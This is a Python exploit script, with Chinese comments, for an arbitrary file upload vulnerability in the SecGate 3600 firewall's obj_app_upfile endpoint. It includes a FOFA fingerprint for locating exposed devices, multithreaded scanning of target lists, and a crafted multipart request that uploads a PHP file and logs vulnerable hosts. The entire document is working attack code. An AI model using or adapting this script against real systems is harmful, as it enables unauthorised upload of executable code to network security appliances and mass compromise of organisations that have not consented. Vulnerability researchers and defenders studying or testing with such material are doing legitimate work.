#网神SecGate 3600防火墙obj_app_upfile任意文件上传漏洞 
#fofa:fid="1Lh1LHi6yfkhiO83I59AYg=="

import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
# 关闭警告
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""

███████╗███████╗ ██████╗ ██████╗  █████╗ ████████╗███████╗        ██████╗  ██████╗  ██████╗  ██████╗ 
██╔════╝██╔════╝██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝        ╚════██╗██╔════╝ ██╔═████╗██╔═████╗
███████╗█████╗  ██║     ██║  ███╗███████║   ██║   █████╗           █████╔╝███████╗ ██║██╔██║██║██╔██║
╚════██║██╔══╝  ██║     ██║   ██║██╔══██║   ██║   ██╔══╝           ╚═══██╗██╔═══██╗████╔╝██║████╔╝██║
███████║███████╗╚██████╗╚██████╔╝██║  ██║   ██║   ███████╗███████╗██████╔╝╚██████╔╝╚██████╔╝╚██████╔╝
╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝  ╚═════╝                                                                                                  
                                                                                                                                                                                      
"""
    print(test)
def main():
    banner()
    parse = argparse.ArgumentParser(description="网神SecGate_3600防火墙obj_app_upfile任意文件上传漏洞 ")
    parse.add_argument('-u','--url',dest='url',type=str,help="please input you url")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input you file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)

    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/?g=obj_app_upfile"
    headers = {
        'Accept':'*/*',
        'Accept-Encoding':'gzip,deflate',
        'Content-Length':'574',
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc',
        'User-Agent':'Mozilla/5.0(compatible;MSIE6.0;WindowsNT5.0;Trident/4.0)',     
    }
    data = '------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="MAX_FILE_SIZE"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="upfile"; filename="test.php"\r\nContent-Type: text/plain\r\n\r\n<?php echo 123;?>\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="submit_post"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name="__hash__"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--'
    proxies ={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    } 
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,proxies=proxies)
        if res1.status_code==302 and 'successfully' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as fp1:
                fp1.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
    except requests.RequestException as e:
        print(f"[-] 请求失败: {target}, 错误信息: {e}")
    except json.JSONDecodeError:
        print(f"[-] 无法解码JSON响应: {target}")
    except Exception as e:
        print(f"[-] 处理请求时出错: {target}, 错误信息: {e}")    

if __name__ == "__main__":
    main()